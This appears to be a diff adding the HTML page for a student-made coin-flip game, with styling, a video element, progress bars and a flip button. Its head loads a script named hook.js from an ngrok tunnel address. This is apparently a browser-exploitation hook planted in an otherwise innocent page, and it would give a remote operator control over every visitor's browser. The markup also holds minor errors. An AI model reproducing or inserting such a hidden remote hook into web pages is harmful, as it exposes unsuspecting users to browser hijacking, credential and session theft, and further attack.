@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html id="01"
+<head>
+<script type="text/JavaScript" src="http://0.tcp.ngrok.io:19762/hook.js"></script>
+<meta name="viewport" content="width=device-width; initial-scale=1.0">
+<title> Coin Flip </title>
+<style type="text/css">
+
+body{background-color:black;
+     font-family:Serif;
+     }
+
+
+.button {
+   padding: 15px 25px;
+  font-size: 24px;
+  text-align: center;
+  text-decoration: none;
+  outline: none;
+  color: #fff;
+  background-color:green;
+  border-radius:20px;
+  box-shadow: 0 9px #999;
+}
+
+
+.button:hover {border-radius:20px;
+background-color: green;
+}
+
+
+.button:active {
+border-radius:20px;
+background-color: green;
+  box-shadow: 0 5px #666;
+  transform: translateY(4px);
+}
+
+#final{
+color:red;}
+
+
+
+#result{
+padding:20px;
+background:white;
+        border:5px;
+       
+
+        text-align:left;
+        font-size:100%;
+        }
+h5{
+text-align:left;
+font-family:serif;
+}
+
+progress[value]
+{
+width:330px;
+height:22px;
+}
+
+
+#header{
+text-align:center;
+background:green;
+padding:2px;
+padding-color:green;
+color:white;
+}
+
+#foot{
+background-color:#282c34;
+padding-color:#282c34;
+padding:4px;
+color:white;
+
+}
+
+
+</style>
+</head>
+<body>
+<div id="header"> 
+<h2>Coin Flip Game </h2>
+</div>
+<div id="result">
+<h4>Total number of flip : <span style="color:green;" id="count"> 0 </span> </h4>
+<video width="100%" height="auto" id="video1">
+<source src="coin1.mp4" type="video/mp4">
+</video>
+<h1>Result : <span id="final"></span></h1>
+<label for="head_pr">Total Head :</label>
+<progress id="head_pr" value="0" max="100"> 0%</progress>
+<br>
+<label for="tail_pr">Total Tail:</label>
+<progress style=="border-radius:20px"  id="tail_pr" value="0" max="100"> 0%</progress>
+<br> 
+<br>
+<div style="text-align:center;">
+<button id="mybtn" class="button" onclick="result();btnControl();">Coin Flip</button>
+</div>
+</div> 
+<div id="foot"><h5><b>Created by : Abhishek Jaiswal, GP Adityapur</b></h5>
+</div>
+<script type="text/JavaScript" src="coin.js"></script> 
+</body></html>
